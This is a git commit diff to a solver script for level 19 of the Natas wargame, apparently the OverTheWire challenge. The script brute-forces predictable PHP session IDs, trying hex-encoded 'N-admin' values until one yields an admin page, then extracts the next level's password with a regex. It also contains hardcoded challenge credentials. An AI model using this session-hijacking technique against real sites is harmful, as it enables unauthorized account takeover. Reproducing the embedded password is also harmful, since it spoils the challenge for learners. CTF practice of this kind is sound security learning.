7c48d7a61883b39b634d87ff338963ac2b9a8609
omega-coder <fy_cherief@esi.dz>
2019-04-05 01:58:23 +0200

    Adds regular expression and finished solution

--- Natas/level19/solve.py
+++ Natas/level19/solve.py
@@ -10,8 +10,12 @@ cookies = {'PHPSESSID': ''}
 session = requests.Session()
 session.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
 
-
-
 for i in range(1, 641):
     cookies['PHPSESSID'] = '{}-admin'.format(i).encode().hex()
-    res = 
+    res = session.get(URL, cookies=cookies)
+    if 'regular' not in res.text:
+        m = re.search(r'Password: [A-Za-z0-9]+', res.text)
+        if m:
+            print(m.group(0))
+
+
